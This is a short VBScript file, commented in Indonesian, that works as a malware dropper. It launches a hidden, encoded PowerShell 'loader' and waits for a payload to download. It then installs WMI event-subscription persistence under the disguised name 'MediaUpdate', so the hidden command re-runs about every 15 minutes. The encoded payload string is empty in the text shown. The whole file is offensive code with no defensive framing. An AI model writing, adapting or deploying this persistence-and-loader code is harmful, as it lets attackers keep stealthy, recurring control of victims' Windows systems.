Dim shell
Set shell = CreateObject("WScript.Shell")

psEncoded = ""

' jalankan loader sekarang
shell.Run "powershell -NoP -WindowStyle Hidden -Enc " & psEncoded, 0, False
WScript.Sleep 3000  ' tunggu payload terdownload dan jalan

' ========== setup WMI persistence ==========
Dim objWMIService, objFilter, objConsumer, objBinding

' akses namespace root\subscription
Set objWMIService = GetObject("winmgmts:\\.\root\subscription")

' --- buat event filter ---
Set objFilter = objWMIService.Get("__EventFilter").SpawnInstance_()
objFilter.Name = "MediaUpdateFilter"
objFilter.EventNameSpace = "root\cimv2"
objFilter.QueryLanguage = "WQL"
objFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
objFilter.Put_

' --- buat consumer ---
Set objConsumer = objWMIService.Get("CommandLineEventConsumer").SpawnInstance_()
objConsumer.Name = "MediaUpdateConsumer"
objConsumer.CommandLineTemplate = "powershell -NoP -WindowStyle Hidden -Enc " & psEncoded
objConsumer.Put_

' --- binding filter dan consumer ---
Set objBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_()
objBinding.Filter = objFilter
objBinding.Consumer = objConsumer
objBinding.Put_
